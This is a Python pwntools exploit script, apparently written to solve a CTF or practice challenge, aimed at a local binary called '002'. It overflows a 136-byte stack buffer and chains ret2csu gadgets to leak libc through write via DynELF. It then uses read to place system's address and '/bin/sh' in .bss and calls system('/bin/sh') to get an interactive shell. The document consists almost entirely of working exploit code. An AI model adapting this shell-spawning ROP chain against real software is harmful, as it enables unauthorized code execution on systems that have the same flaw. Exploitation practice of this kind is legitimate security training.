#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *

#context.log_level = 'debug'

# load program
p = process('002')

# get info from ELF
elf = ELF('002')

# infomation
bss = elf.symbols['__bss_start']
log.info("bss start at: " + hex(bss))

read_got = elf.symbols['got.read']
log.info("read_got: " + hex(read_got))

write_got = elf.symbols['got.write']
log.info("write_got: " + hex(write_got))

main = elf.symbols['main']
log.info("main @ " + hex(main))

log.info("")
log.info("")

# overflow point
buflen = 136

# gadgets
mmmcall = 0x400600
ppppppr = 0x40061a

# junkcode
padding = 0xdeadbeef

# function1
# need leak memory
def leak(address):
    # read(1, address, 8)
    payload1 = ""
    payload1 += "\x00" * buflen
    payload1 += p64(ppppppr)
    rbx = 0
    rbp = 1
    r12 = write_got         # call   QWORD PTR [r12+rbx*8]
    r13 = 8                 # mov    rdx,r13
    r14 = address           # mov    rsi,r14
    r15 = 1                 # mov    edi,r15
    ret = mmmcall
    payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

    ret = main
    payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg

    p.sendline(payload1)
    #log.info("##################-payload-1--sended!---biu~")
    p.recvuntil('Hello, World\n')
    data = p.recv(8)
    log.info("leaking memory... %#x => %s" %(address, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=ELF('002'))
system = d.lookup('system', 'libc')
log.info("system address: " + hex(system))

log.info("Congratulation! level[1] pass! :)")
log.info("")
log.info("")

#function2
# write(0, bss, 16)       # bss: system_addr(8) +  '/bin/sh\0'(8)
payload2 = ""
payload2 += "\x00" * buflen
payload2 += p64(ppppppr)
rbx = 0
rbp = 1
r12 = read_got           # call   QWORD PTR [r12+rbx*8]
r13 = 16                 # mov    rdx,r13
r14 = bss                # mov    rsi,r14
r15 = 0                  # mov    edi,r15
ret = mmmcall
payload2 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload2 += p64(padding) * 7 + p64(ret) # add rsp,0x8; pop 6 regs

p.sendline(payload2)
log.info("##################-payload-2--sended!---biu~")

sleep(2)
log.info("recv[2]: " + p.recvuntil('Hello, World\n'))

p.send(p64(system) + '/bin/sh\0')
log.info("system_addr + '/bin/sh\\0' sended!")

log.info("Congratulation! level[2] pass! :)")
log.info("")
log.info("")


# function check
# read(1, bss, 16)   
payload1 = ""
payload1 += "\x00" * buflen
payload1 += p64(ppppppr)
rbx = 0
rbp = 1
r12 = write_got         # call   QWORD PTR [r12+rbx*8]
r13 = 16                # mov    rdx,r13
r14 = bss               # mov    rsi,r14
r15 = 1                 # mov    edi,r15
ret = mmmcall
payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg

p.sendline(payload1)
log.info("##################-debug-payload--sended!---biu~")

log.info("recv[*]: " + p.recvuntil('Hello, World\n'))
sleep(2)

data1 = p.recv(8)
data2 = p.recv(8)
log.info("Got debug info! data = " + data1 + data2)
log.info("system -- " + hex(u64(data1)))
log.info("binsh -- " + data2)

log.info("Nothing worng! Check finished. go ahead!")
log.info("")
log.info("")

# function3
# system('/bin/sh\0')     # bss(bss+8)
payload3 = ""
payload3 += "\x00" * buflen
payload3 += p64(ppppppr)
rbx = 0
rbp = 1 
r12 = bss                # call   QWORD PTR [r12+rbx*8]
r13 = bss+8              # mov    rdx,r13
r14 = bss+8              # mov    rsi,r14
r15 = bss+8              # mov    edi,r15
ret = mmmcall
payload3 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main               # don't need return
payload3 += p64(padding) * 7 + p64(ret)

p.sendline(payload3)
log.info("##################-payload-3--sended!---biu~")

sleep(3)
log.info("recv[3]: " + p.recvuntil('Hello, World\n'))

log.info("Congratulation! level[3] pass! :)")
log.info("You WIN The Game!")
log.info("Here is the shell you created~ :")

p.interactive()
